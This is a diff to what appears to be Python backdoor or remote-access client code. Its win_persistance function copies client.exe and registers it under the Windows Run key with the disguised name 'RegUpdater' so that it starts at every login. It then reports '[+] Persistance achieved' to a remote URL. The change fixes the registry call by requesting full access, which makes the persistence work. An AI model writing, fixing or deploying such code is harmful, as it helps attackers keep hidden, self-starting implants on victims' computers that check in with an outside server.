@@ -34,7 +34,8 @@ def win_persistance():
         if not os.path.exists(destination):
             try:
                 shutil.copyfile(path + '\client.exe', destination)
-                key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run")
+                key = wreg.OpenKey(wreg.HKEY_CURRENT_USER,
+                        "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
                 wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
                 key.Close()
                 requests.post(URL, data="[+] Persistance achieved")
